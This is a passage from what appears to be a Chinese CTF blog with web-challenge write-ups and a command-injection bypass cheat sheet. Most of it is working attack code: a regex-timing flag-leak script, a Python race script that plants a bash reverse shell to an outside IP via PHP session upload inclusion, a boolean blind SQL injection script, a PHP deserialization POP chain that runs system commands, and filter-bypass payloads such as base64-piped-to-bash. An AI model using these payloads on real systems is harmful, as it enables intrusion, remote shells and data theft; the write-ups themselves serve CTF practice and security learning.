CURLOPT_FILE, $resource);</span><br><span class="line">				curl_setopt($down, CURLOPT_TIMEOUT, <span class="number">200</span>);</span><br><span class="line">				curl_setopt($down, CURLOPT_URL, $url); </span><br><span class="line">				curl_setopt($down, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">				curl_exec($down);</span><br><span class="line">				$filename = <span class="string">&quot;./you_will_never_find_me_hiahiahia_and_my_duty_is_storage_tmp_file/&quot;</span> . md5(time()) . <span class="string">&quot;.png&quot;</span>;</span><br><span class="line">				copy($tmpFile, $filename);</span><br><span class="line">				@unlink($tmpFile);</span><br><span class="line">				<span class="keyword">if</span>($dieMess == <span class="string">&quot;&quot;</span>)</span><br><span class="line">					$dieMess = <span class="string">&quot;Your picture&#x27;s colorful number is &quot;</span> . getMainColor($filename, <span class="string">&#x27;1&#x27;</span>) . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">				@unlink($filename);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				$dieMess = <span class="string">&quot;Woops, seem I can not visit it!&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$dieMess = <span class="string">&quot;Extension not allowed!&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以应该是将tmpfile文件的内容赋值给filename中，然后访问即可，接下来就是找flag在哪里，可以猜一下是否在/flag或者/flag.txt~</p>
<h2 id="1115"><a href="#1115" class="headerlink" title="1115"></a>1115</h2><p>扫描一下 发现有source目录</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;safe_regexp&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAG = File.open(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&quot;r&quot;</span>).read <span class="comment"># 是一个MD5，提交时请包裹上flag&#123;&#125;</span></span><br><span class="line"></span><br><span class="line">String.class_eval <span class="keyword">do</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">text</span></span></span><br><span class="line">    <span class="keyword">return</span> [<span class="keyword">self</span>].pack(<span class="string">&#x27;H*&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  File.open(<span class="string">&#x27;/app/app/index.html&#x27;</span> , <span class="string">&quot;r&quot;</span>).read</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/check/:regex&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    regexp = Regexp.new(params[<span class="string">&#x27;regex&#x27;</span>].text)</span><br><span class="line">    p regexp</span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&quot;False!&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    SafeRegexp.execute(regexp, <span class="symbol">:match?</span>, FLAG, <span class="symbol">timeout:</span> <span class="number">3</span>)</span><br><span class="line">    <span class="string">&quot;OK!&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&quot;False!&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/source&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  File.open(__FILE_<span class="number">_</span> , <span class="string">&quot;r&quot;</span>).read</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>这题是正则表达式延时，直接打就行了~</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;net/http&#x27;</span></span><br><span class="line"></span><br><span class="line">CHALLENGE = <span class="string">&#x27;http://a.y1ng.vip:1115&#x27;</span></span><br><span class="line"></span><br><span class="line">String.class_eval <span class="keyword">do</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">hex</span></span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">self</span>.each_byte <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">      res += <span class="string">&quot;%02x&quot;</span> % i</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random</span><span class="params">(len)</span></span></span><br><span class="line">  chars = (<span class="string">&quot;a&quot;</span>..<span class="string">&quot;z&quot;</span>).to_a + (<span class="string">&quot;A&quot;</span>..<span class="string">&quot;Z&quot;</span>).to_a + (<span class="string">&quot;0&quot;</span>..<span class="string">&quot;9&quot;</span>).to_a</span><br><span class="line">  s = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="number">1</span>.upto(len) <span class="keyword">do</span></span><br><span class="line">    s &lt;&lt; chars[rand(chars.size - <span class="number">1</span>)]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  s</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_result</span><span class="params">(reg, suffix)</span></span></span><br><span class="line">  full_regexp = <span class="string">&quot;^(?=&quot;</span> + reg + <span class="string">&quot;)((.*)*)*&quot;</span> + suffix</span><br><span class="line">  p full_regexp</span><br><span class="line">  uri = URI(CHALLENGE + <span class="string">&#x27;check/&#x27;</span> + full_regexp.hex)</span><br><span class="line">  Net::HTTP.get_response(uri)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(flag, r)</span></span></span><br><span class="line">  chars = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">  (<span class="number">0</span>..<span class="number">15</span>).each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    <span class="keyword">if</span> check_result(flag + chars[i], r).body[<span class="string">&quot;False&quot;</span>]</span><br><span class="line">      p flag + chars[i]</span><br><span class="line">      <span class="keyword">return</span> leak(flag + chars[i], r)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">r = random(<span class="number">10</span>)+<span class="string">&#x27;$&#x27;</span></span><br><span class="line">leak(<span class="string">&#x27;&#x27;</span>, r)</span><br></pre></td></tr></table></figure>



<h2 id="2014"><a href="#2014" class="headerlink" title="2014"></a>2014</h2><p>上面存在文件包含:<br>使用一下指令读取源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ASCII.UCS-2BE&#x2F;resource&#x3D;login.php</span><br><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ASCII.UCS-2BE&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>

<p>得到以下内容:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;d3bug&#x27;</span>])) </span><br><span class="line">&#123; phpinfo(); &#125; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) </span><br><span class="line">&#123; $page = $_GET[<span class="string">&#x27;page&#x27;</span>]; </span><br><span class="line">$filter = <span class="string">&quot;/\.\.|base|file|gopher|http|ftp|phar|base|string|data|zip|compress|base|decode|read|pear|rot|crypt|pear|utf|flag/i&quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (preg_match( $filter , $page) ) </span><br><span class="line">&#123; <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>); &#125; <span class="keyword">include</span> $page; &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;./?page=login.php&#x27;&lt;/script&gt;&quot;</span>; &#125; </span><br></pre></td></tr></table></figure>

<p>然后看到phpinfo()里面，可以使用session文件包含，因为PHP_SESSION_UPLOAD_PROGRESS是有开的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sess_id=<span class="string">&quot;tlife&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_upload</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res= s.post(</span><br><span class="line">            url=<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=/tmp/session/sess_<span class="subst">&#123;sess_id&#125;</span>&quot;</span>,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?=`bash -c &#x27;bash -i &gt;&amp; /dev/tcp/110.42.133.120/9999 0&gt;&amp;1&#x27;`;?&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;xxx.txt&#x27;</span>, open(<span class="string">&quot;shell.txt&quot;</span>, <span class="string">&quot;r&quot;</span>))&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sess_id&#125;</span><br><span class="line">        )</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    thread=threading.Thread(target=session_upload)</span><br><span class="line">    thread.start()</span><br></pre></td></tr></table></figure>

<p>就可以了~</p>
<h2 id="1119"><a href="#1119" class="headerlink" title="1119"></a>1119</h2><p>看了一下过滤了最重要的info库，就意味着大概率是无列名盲注了，然后过滤了一些比较符号，还有like、rlike等正则匹配函数，那么本题似乎只能用case when了的感觉<br>接下</p>
<p>判断注入类型</p>
<p>布尔盲注，回显分为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试语句：:root&#39;and&#x2F;**&#x2F;case&#x2F;**&#x2F;1&#x2F;**&#x2F;when&#x2F;**&#x2F;1&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end#</span><br><span class="line">true:welcomt admin</span><br><span class="line">false:wrong</span><br></pre></td></tr></table></figure>

<p>编写盲注脚本：</p>
<p>构造注入语句</p>
<p>这题的截取函数基本都过滤了，所以这里使用<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210818110110.png" alt="img" style="zoom:67%;"></p>
<p>接下来就是跑表名，由于in库被过滤了，这里试了一下 发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics;</span><br></pre></td></tr></table></figure>

<p>是可以的<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210818205724.png" alt="img"></p>
<p>就可以跑出表名了<br>接下来使用union无列名盲注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select a.1 from (select 1,2 union select * from &#96;SeCrrreT&#96;)a limit 1,2</span><br></pre></td></tr></table></figure>

<p>得到表名以后 直接select * from SeCrrreT跑不出来，所以可以猜想肯定不止一行，所以后面要加limit 然后用无列名盲注，去尝试字段数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://a.y1ng.vip:1119/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">payload</span>):</span></span><br><span class="line">    data1=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            payload_tr=<span class="string">f&quot;root&#x27;and case ascii(reverse(left((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>))) when <span class="subst">&#123;j&#125;</span> then 1 else 0 end#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>:payload_tr,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1141&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r=s.post(url=url,data=data).text</span><br><span class="line">            <span class="comment">#print(r)</span></span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Welcome Admin!&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                data1+=chr(j)</span><br><span class="line">                print(data1)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#payload=&quot;database()&quot;#ctfgame</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(table_name) from sys.schema_table_statistics&quot;#users,SeCrrreT</span></span><br><span class="line">    payload=<span class="string">&quot;select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2&quot;</span><span class="comment">#flag&#123;fab99a66-23db-47b1-9db4-9262664d76a8&#125;</span></span><br><span class="line">    sql_injection(payload)</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/30/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%A2%98%E8%A7%A3/">2021祥云杯web题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-30</time><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>就做了俩题，另外一题还是赛后半小时后才做出来，太太太太太太太太太太太菜了</p>
<h2 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h2><p>网上有现成的链子 拿到直接打就行了，后面在研究一下过程吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> $output;</span><br><span class="line">		<span class="keyword">private</span> $processes = [];</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">			<span class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;jiang&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$default = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">	<span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $streams = [];</span><br><span class="line">		<span class="keyword">private</span> $seekable = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $remoteStream;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $source;</span><br><span class="line">		<span class="keyword">private</span> $size=<span class="number">-10</span>;</span><br><span class="line">		<span class="keyword">private</span> $buffer;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">			<span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line">			$a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;system(<span class="string">&#x27;cat /flag.txt&#x27;</span>);phpinfo();	&#125;;</span><br><span class="line">			$a = \Opis\<span class="built_in">Closure</span>\serialize($a);</span><br><span class="line">			$b = unserialize($a);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;source=$b;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h2><p>这题的就在于扫扫扫扫描。。。。。。也就是信息收集</p>
<p>首先是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.login.php.swp</span><br></pre></td></tr></table></figure>

<p>有源码，然后username可控</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line">ob_start();</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check3</span>(<span class="params">$username</span>)</span>&#123;</span><br><span class="line">	$pattern = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|&lt;|&gt;|\?|\*|load_file|outfile|dumpfile|sub|hex|where&quot;</span>;</span><br><span class="line">	$pattern .= <span class="string">&quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line">	$pattern .= <span class="string">&quot;|select|insert|update|delete|load_file|into outfile|drop&quot;</span>;</span><br><span class="line">	$pattern .=<span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line">	$pattern .=<span class="string">&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|\@|:\/\/|flag&quot;</span>;</span><br><span class="line">	$pattern .=<span class="string">&quot;|file|dict|gopher&quot;</span>;</span><br><span class="line"></span><br><span class="line">	$vpattern = explode(<span class="string">&quot;|&quot;</span>,$pattern);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>($vpattern <span class="keyword">as</span> $value)&#123;	</span><br><span class="line">		<span class="keyword">if</span> (preg_match( <span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, $username ))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;æ£€æµ‹åˆ°æ¶æ„å­—ç¬¦&quot;</span>;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=file_get_content(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">check3($username);</span><br><span class="line">$username=json_decode($username)-&gt;username;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>($username)&#123;</span><br><span class="line">	$_SESSION[<span class="string">&#x27;user1&#x27;</span>]=$username;</span><br><span class="line">	Header(<span class="string">&quot;Location:./index.php&quot;</span>);</span><br><span class="line">	ob_end_flush();</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以发现session_start()函数，username又存入session中，大概率就是session文件包含了，于是再找找哪里能继续包含内容<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210823142410.png" alt="img" style="zoom:67%;"><br>在后面输入url窗口那里，发现输入这个，可以读到include123.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x2F;admin&#x2F;include123.php</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210823142529.jpg" alt="img" style="zoom:50%;">
然后这里就有一个include函数，那么就可以实现session文件包含了

<p><strong>解法一：</strong></p>
<p>利用username进行session文件包含，由于后面使用了json_decode，所以我们可以使用unioncode编码输入内容，这样就就可以绕过前面的过滤了<br>PS:一开始一直没成功，后面才知道是实体化编码的问题，输入的内容虽然可以正常显示 但已经不是原本的东西了，其中就是&lt;这个编码错误了，这个是学长给的unioncode编码脚本，用这个就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UNICODE</span>(<span class="params">payload</span>):</span></span><br><span class="line">	<span class="comment">#unicode</span></span><br><span class="line">	res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\u00&#123;&#125;&quot;</span>.format(hex(ord(i))[<span class="number">2</span>:])</span><br><span class="line">		res_payload += i</span><br><span class="line">	print(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to UNICDOE: \&quot;&#123;&#125;\&quot;&quot;</span>.format(payload,res_payload))</span><br></pre></td></tr></table></figure>

<p>直接上网站加密就没成功了。。看下面这个<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210823143230.png" alt="img" style="zoom:67%;"></p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;admin&#x2F;include123.php?u&#x3D;&#x2F;tmp&#x2F;sess_xxxx(你的session)</span><br></pre></td></tr></table></figure>

<p><strong>解法二：</strong></p>
<p>可以看到我们输入的链接最终也会在session文件里面出现，所以此时我们可以利用这个链接进行文件包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;admin&#x2F;include123.php?u&#x3D;&#x2F;tmp&#x2F;sess_xxxx(你的session)&amp;a&#x3D;&lt;?system(&#39;ls&#39;);?&gt;</span><br></pre></td></tr></table></figure>

<p>但是需要注意的是不能有空格，会被直接截断！，所以后面可以使用这个进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;$&#x2F;fl&quot;&quot;ag</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210823143616.png" alt="img" style="zoom: 50%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210823143621.png" alt="img" style="zoom:50%;">

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>还是太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太菜了，要走的路还很远，好好加油<br>反思一下这次这个安全监测应该可以很快做出来的，主要是信息收集得不行，太慢了，而且换了好几个工具有必要更新一下字典之类的了！</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E7%BB%95%E8%BF%87/">命令执行和绕过</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-26</time><div class="content"><h2 id="高危函数"><a href="#高危函数" class="headerlink" title="高危函数:"></a>高危函数:</h2><p>system()、exec()、shell_exec()、passthru()、pctnl_exec()、popen()、proc_open() 注：反引号是shell_exec()的别名</p>
<h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><p>程序过滤不严谨，导致用户可以将代码注入并执行。高危函数:eval()、assert()、preg_replace()、call_user_func()等等和命令执行的区别是：一个执行系统命令，一个执行PHP代码</p>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;&#x2F;&#x2F; 用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>

<h3 id="过滤某关键字"><a href="#过滤某关键字" class="headerlink" title="过滤某关键字"></a>过滤某关键字</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca\t y1n\g.php反斜线绕过</span><br><span class="line">cat y1”ng.php 两个单引号绕过</span><br><span class="line">echo “Y2F0IC9mbGFn” | base64 -d | bash#base64 编码绕过</span><br><span class="line">echo “6361742079316E672E706870” | xxd -r -p | bash#hex 编码绕过</span><br><span class="line">cat y1 [n] g.php用[]匹配</span><br><span class="line">cat y1n*用*匹配任意</span><br><span class="line">cat y1n?</span><br><span class="line">cat y1&#123;a..z&#125;g </span><br><span class="line">more tlif3</span><br><span class="line">less tlif3</span><br><span class="line">head tlif3</span><br><span class="line">tail tlif3</span><br><span class="line">nl f*</span><br><span class="line">m4 *</span><br></pre></td></tr></table></figure>

<h2 id="escapeshellcmd-escapeshellarg绕过"><a href="#escapeshellcmd-escapeshellarg绕过" class="headerlink" title="escapeshellcmd+escapeshellarg绕过"></a>escapeshellcmd+escapeshellarg绕过</h2><h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><p>shell_exec等无回显函数</p>
<h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><p>ls;sleep(3)</p>
<h3 id="复制法"><a href="#复制法" class="headerlink" title="复制法"></a>复制法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy flag.php flag.txt</span><br><span class="line">mv flag.php flag.txt</span><br><span class="line">cat flag.php &gt; flag.txt</span><br></pre></td></tr></table></figure>

